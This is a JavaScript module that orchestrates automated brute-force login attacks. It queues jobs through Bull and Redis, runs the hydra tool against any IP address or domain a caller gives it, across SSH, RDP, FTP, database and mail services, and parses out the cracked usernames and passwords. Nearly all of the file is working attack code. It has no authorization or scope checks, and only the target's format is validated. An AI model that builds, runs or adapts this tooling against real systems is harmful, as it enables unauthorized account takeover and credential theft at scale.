/**
 * Attack Orchestrator Module
 * Manages attack queue, scheduling, and execution using Bull
 * @module attackOrchestrator
 */

const Queue = require('bull');
const { logger } = require('./logManager');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs').promises;
const { v4: uuidv4 } = require('uuid');

/**
 * Attack Orchestrator Service
 * Handles attack job queuing, processing, and monitoring
 */
class AttackOrchestrator {
  constructor() {
    this.redisConfig = {
      host: process.env.REDIS_HOST || 'localhost',
      port: process.env.REDIS_PORT || 6379,
      password: process.env.REDIS_PASSWORD || undefined,
      maxRetriesPerRequest: null,
      enableReadyCheck: false
    };

    // Create queues for different attack types
    this.attackQueue = new Queue('attacks', { redis: this.redisConfig });
    this.priorityQueue = new Queue('priority-attacks', { redis: this.redisConfig });
    
    this.maxConcurrent = parseInt(process.env.MAX_CONCURRENT_ATTACKS) || 3;
    this.attackTimeout = parseInt(process.env.ATTACK_TIMEOUT) || 3600000; // 1 hour
    
    this.setupProcessors();
    this.setupEventHandlers();
    
    logger.info('Attack Orchestrator initialized');
  }

  /**
   * Setup queue processors
   * @private
   */
  setupProcessors() {
    // Process regular attacks
    this.attackQueue.process(this.maxConcurrent, async (job) => {
      return this.processAttack(job);
    });

    // Process priority attacks
    this.priorityQueue.process(this.maxConcurrent, async (job) => {
      return this.processAttack(job);
    });
  }

  /**
   * Setup event handlers for queue monitoring
   * @private
   */
  setupEventHandlers() {
    // Attack queue events
    this.attackQueue.on('completed', (job, result) => {
      logger.info(`Attack job ${job.id} completed successfully`);
    });

    this.attackQueue.on('failed', (job, error) => {
      logger.error(`Attack job ${job.id} failed: ${error.message}`);
    });

    this.attackQueue.on('stalled', (job) => {
      logger.warn(`Attack job ${job.id} has stalled`);
    });

    this.attackQueue.on('progress', (job, progress) => {
      logger.debug(`Attack job ${job.id} progress: ${progress}%`);
    });

    // Priority queue events
    this.priorityQueue.on('completed', (job, result) => {
      logger.info(`Priority attack job ${job.id} completed successfully`);
    });

    this.priorityQueue.on('failed', (job, error) => {
      logger.error(`Priority attack job ${job.id} failed: ${error.message}`);
    });
  }

  /**
   * Queue a new attack
   * @param {Object} attackData - Attack configuration
   * @param {boolean} priority - Whether to use priority queue
   * @returns {Promise<Object>} Job information
   */
  async queueAttack(attackData, priority = false) {
    try {
      const jobId = uuidv4();
      const queue = priority ? this.priorityQueue : this.attackQueue;
      
      const jobOptions = {
        jobId,
        attempts: attackData.retries || 3,
        backoff: {
          type: 'exponential',
          delay: 2000
        },
        timeout: attackData.timeout || this.attackTimeout,
        removeOnComplete: false,
        removeOnFail: false
      };

      const job = await queue.add({
        ...attackData,
        jobId,
        queuedAt: new Date().toISOString()
      }, jobOptions);

      logger.info(`Attack queued with ID: ${jobId}, Priority: ${priority}`);

      return {
        jobId,
        queueType: priority ? 'priority' : 'standard',
        position: await job.getPosition(),
        status: 'queued'
      };
    } catch (error) {
      logger.error(`Failed to queue attack: ${error.message}`);
      throw new Error(`Queue error: ${error.message}`);
    }
  }

  /**
   * Process an attack job
   * @param {Object} job - Bull job object
   * @returns {Promise<Object>} Attack results
   * @private
   */
  async processAttack(job) {
    const { jobId, attackType, target, options = {} } = job.data;
    
    logger.info(`Processing attack job ${jobId}: ${attackType} against ${target}`);

    try {
      // Update job progress
      await job.progress(10);

      // Validate attack parameters
      this._validateAttackParams(attackType, target, options);
      await job.progress(20);

      // Prepare attack command
      const command = this._buildAttackCommand(attackType, target, options);
      await job.progress(30);

      // Execute attack
      const result = await this._executeAttack(command, job);
      await job.progress(90);

      // Parse and store results
      const parsedResult = await this._parseAttackResult(result, attackType);
      await job.progress(100);

      logger.info(`Attack job ${jobId} completed successfully`);

      return {
        jobId,
        attackType,
        target,
        status: 'completed',
        startedAt: result.startedAt,
        completedAt: new Date().toISOString(),
        duration: result.duration,
        result: parsedResult,
        exitCode: result.exitCode
      };
    } catch (error) {
      logger.error(`Attack job ${jobId} failed: ${error.message}`);
      throw error;
    }
  }

  /**
   * Validate attack parameters
   * @param {string} attackType - Type of attack
   * @param {string} target - Target identifier
   * @param {Object} options - Attack options
   * @private
   */
  _validateAttackParams(attackType, target, options) {
    const validAttackTypes = [
      'ssh', 'ftp', 'http', 'https', 'smtp', 'mysql', 
      'postgresql', 'rdp', 'vnc', 'telnet', 'pop3', 'imap'
    ];

    if (!validAttackTypes.includes(attackType)) {
      throw new Error(`Invalid attack type: ${attackType}`);
    }

    if (!target || target.trim() === '') {
      throw new Error('Target is required');
    }

    // Validate target format (IP or domain)
    const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
    const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/;
    
    if (!ipRegex.test(target) && !domainRegex.test(target)) {
      throw new Error('Invalid target format (must be IP address or domain)');
    }
  }

  /**
   * Build attack command based on parameters
   * @param {string} attackType - Type of attack
   * @param {string} target - Target identifier
   * @param {Object} options - Attack options
   * @returns {Object} Command configuration
   * @private
   */
  _buildAttackCommand(attackType, target, options) {
    const {
      port,
      username,
      passwordList,
      usernameList,
      threads = 4,
      verbose = false,
      timeout = 30
    } = options;

    // Base hydra command
    const args = ['-V'];

    // Add threads
    args.push('-t', String(threads));

    // Add timeout
    args.push('-w', String(timeout));

    // Add username/password lists or values
    if (usernameList) {
      args.push('-L', usernameList);
    } else if (username) {
      args.push('-l', username);
    }

    if (passwordList) {
      args.push('-P', passwordList);
    }

    // Add target
    if (port) {
      args.push('-s', String(port));
    }

    args.push(target);

    // Add service
    args.push(attackType);

    // Additional service-specific options
    if (options.path && (attackType === 'http' || attackType === 'https')) {
      args.push(options.path);
    }

    return {
      command: 'hydra',
      args,
      options: {
        timeout: timeout * 1000,
        maxBuffer: 1024 * 1024 * 10 // 10MB
      }
    };
  }

  /**
   * Execute attack command
   * @param {Object} commandConfig - Command configuration
   * @param {Object} job - Bull job object
   * @returns {Promise<Object>} Execution result
   * @private
   */
  async _executeAttack(commandConfig, job) {
    return new Promise((resolve, reject) => {
      const startedAt = new Date().toISOString();
      const startTime = Date.now();
      
      let stdout = '';
      let stderr = '';

      const process = spawn(commandConfig.command, commandConfig.args, {
        timeout: commandConfig.options.timeout
      });

      // Capture stdout
      process.stdout.on('data', (data) => {
        const chunk = data.toString();
        stdout += chunk;
        
        // Update progress based on output
        if (chunk.includes('host:') || chunk.includes('login:')) {
          job.progress(50 + Math.random() * 30).catch(() => {});
        }
      });

      // Capture stderr
      process.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      // Handle process completion
      process.on('close', (code) => {
        const duration = Date.now() - startTime;

        if (code === 0 || stdout.includes('password:')) {
          resolve({
            exitCode: code,
            stdout,
            stderr,
            startedAt,
            duration
          });
        } else {
          reject(new Error(`Attack process exited with code ${code}: ${stderr}`));
        }
      });

      // Handle process errors
      process.on('error', (error) => {
        reject(new Error(`Failed to execute attack: ${error.message}`));
      });
    });
  }

  /**
   * Parse attack result from output
   * @param {Object} result - Raw execution result
   * @param {string} attackType - Type of attack
   * @returns {Promise<Object>} Parsed results
   * @private
   */
  async _parseAttackResult(result, attackType) {
    const { stdout, stderr } = result;
    const credentials = [];
    const attempts = [];

    // Parse successful credentials
    const credRegex = /\[(\d+)\]\[([^\]]+)\]\s+host:\s+([^\s]+)\s+login:\s+([^\s]+)\s+password:\s+([^\s]+)/g;
    let match;

    while ((match = credRegex.exec(stdout)) !== null) {
      credentials.push({
        port: match[1],
        service: match[2],
        host: match[3],
        login: match[4],
        password: match[5]
      });
    }

    // Extract attempt statistics
    const attemptMatch = stdout.match(/(\d+)\s+of\s+(\d+)\s+target/);
    if (attemptMatch) {
      attempts.push({
        completed: parseInt(attemptMatch[1]),
        total: parseInt(attemptMatch[2])
      });
    }

    return {
      success: credentials.length > 0,
      credentialsFound: credentials.length,
      credentials,
      attempts,
      rawOutput: stdout,
      errors: stderr ? stderr.split('\n').filter(line => line.trim()) : []
    };
  }

  /**
   * Get job status
   * @param {string} jobId - Job identifier
   * @returns {Promise<Object>} Job status
   */
  async getJobStatus(jobId) {
    try {
      // Check both queues
      let job = await this.attackQueue.getJob(jobId);
      let queueType = 'standard';

      if (!job) {
        job = await this.priorityQueue.getJob(jobId);
        queueType = 'priority';
      }

      if (!job) {
        throw new Error('Job not found');
      }

      const state = await job.getState();
      const progress = job.progress();
      const result = job.returnvalue;
      const failedReason = job.failedReason;

      return {
        jobId,
        queueType,
        state,
        progress,
        data: job.data,
        result,
        failedReason,
        attempts: job.attemptsMade,
        maxAttempts: job.opts.attempts,
        timestamp: job.timestamp,
        processedOn: job.processedOn,
        finishedOn: job.finishedOn
      };
    } catch (error) {
      logger.error(`Failed to get job status: ${error.message}`);
      throw error;
    }
  }

  /**
   * Cancel a job
   * @param {string} jobId - Job identifier
   * @returns {Promise<boolean>} Success status
   */
  async cancelJob(jobId) {
    try {
      let job = await this.attackQueue.getJob(jobId);
      
      if (!job) {
        job = await this.priorityQueue.getJob(jobId);
      }

      if (!job) {
        throw new Error('Job not found');
      }

      await job.remove();
      logger.info(`Job ${jobId} cancelled`);
      return true;
    } catch (error) {
      logger.error(`Failed to cancel job: ${error.message}`);
      throw error;
    }
  }

  /**
   * Get queue statistics
   * @returns {Promise<Object>} Queue statistics
   */
  async getQueueStats() {
    try {
      const [
        waitingCount,
        activeCount,
        completedCount,
        failedCount,
        delayedCount,
        priorityWaitingCount,
        priorityActiveCount
      ] = await Promise.all([
        this.attackQueue.getWaitingCount(),
        this.attackQueue.getActiveCount(),
        this.attackQueue.getCompletedCount(),
        this.attackQueue.getFailedCount(),
        this.attackQueue.getDelayedCount(),
        this.priorityQueue.getWaitingCount(),
        this.priorityQueue.getActiveCount()
      ]);

      return {
        standard: {
          waiting: waitingCount,
          active: activeCount,
          completed: completedCount,
          failed: failedCount,
          delayed: delayedCount
        },
        priority: {
          waiting: priorityWaitingCount,
          active: priorityActiveCount
        },
        maxConcurrent: this.maxConcurrent
      };
    } catch (error) {
      logger.error(`Failed to get queue stats: ${error.message}`);
      throw error;
    }
  }

  /**
   * Clean completed jobs older than specified age
   * @param {number} maxAge - Max age in milliseconds
   * @returns {Promise<number>} Number of jobs cleaned
   */
  async cleanOldJobs(maxAge = 86400000) { // 24 hours default
    try {
      const cleaned = await Promise.all([
        this.attackQueue.clean(maxAge, 'completed'),
        this.attackQueue.clean(maxAge, 'failed'),
        this.priorityQueue.clean(maxAge, 'completed'),
        this.priorityQueue.clean(maxAge, 'failed')
      ]);

      const totalCleaned = cleaned.reduce((sum, jobs) => sum + jobs.length, 0);
      logger.info(`Cleaned ${totalCleaned} old jobs`);
      return totalCleaned;
    } catch (error) {
      logger.error(`Failed to clean old jobs: ${error.message}`);
      throw error;
    }
  }

  /**
   * Pause queues
   * @returns {Promise<void>}
   */
  async pauseQueues() {
    await Promise.all([
      this.attackQueue.pause(),
      this.priorityQueue.pause()
    ]);
    logger.info('Attack queues paused');
  }

  /**
   * Resume queues
   * @returns {Promise<void>}
   */
  async resumeQueues() {
    await Promise.all([
      this.attackQueue.resume(),
      this.priorityQueue.resume()
    ]);
    logger.info('Attack queues resumed');
  }

  /**
   * Close queues (cleanup)
   * @returns {Promise<void>}
   */
  async close() {
    await Promise.all([
      this.attackQueue.close(),
      this.priorityQueue.close()
    ]);
    logger.info('Attack queues closed');
  }
}

// Export singleton instance
module.exports = new AttackOrchestrator();
